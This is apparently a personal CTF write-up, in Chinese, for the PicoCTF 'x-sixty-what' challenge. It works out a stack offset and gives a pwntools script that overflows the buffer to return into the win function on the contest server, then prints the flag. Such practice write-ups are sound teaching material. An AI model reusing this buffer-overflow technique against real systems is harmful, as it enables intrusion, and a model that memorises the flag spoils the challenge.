---
title: PicoCTF - x-sixty-what
tags: [PicoCTF, CTF, PWN]

category: "Security｜Practice｜PicoCTF｜PWN"
date: 2024-01-31
---

# PicoCTF - x-sixty-what
<!-- more -->

## Source code
:::spoiler
```cpp=

```
:::

## Recon
這一題有點奇怪，沒有想像中簡單，看起來就是一個簡單的return 2 function的問題，但是看了objdump的flag function原本應該是0x401236，但是會友segmentation fault，看了其他的WP[^x_sixty_what_WP]，發現應該return到0x40123b，不太知道為甚麼
* 第一張是return 2 0x401236
![](https://hackmd.io/_uploads/Bk2PZ_0ch.png)

* 第二張是return 2 0x40123b
    ![](https://hackmd.io/_uploads/SymO-uAqn.png)

## Exploit
1. 用動態的方式看offset
$$
0x7fffffffd758 - 0x00007fffffffd710 = 0x48
$$
```python=
from pwn import *

r = remote('saturn.picoctf.net', 58166)
# r = process('./vuln')
context.arch = 'amd64'

raw_input()
print(r.recvline().strip().decode())

payload = b'a'*0x48 + p64(0x40123b)
print(payload)
r.sendline(payload)

r.interactive()
```

Flag: `picoCTF{b1663r_15_b3773r_e79d5a75}`

## Reference
[^x_sixty_what_WP]:[x-sixty-what WP](https://ctftime.org/writeup/33199)